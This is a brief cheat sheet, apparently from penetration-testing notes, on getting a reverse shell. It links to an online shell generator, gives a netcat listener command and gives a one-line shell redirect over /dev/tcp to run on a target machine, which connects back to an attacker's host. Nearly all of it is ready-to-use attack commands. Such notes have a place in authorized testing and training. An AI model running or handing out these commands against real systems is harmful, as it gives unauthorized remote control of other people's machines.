The easiest way to generate a reverse shell is to use https://www.revshells.com/
Otherwise this cheatsheet reports some possible reverse shells.

## Listener

The listener can wait with:

```shell
nc -lvnp $PORT
```

Then a shell must be triggered on the target system.

## Target

On the target this needs to be executed.

```shell
sh -i >& /dev/tcp/$HOST/$PORT 0>&1
```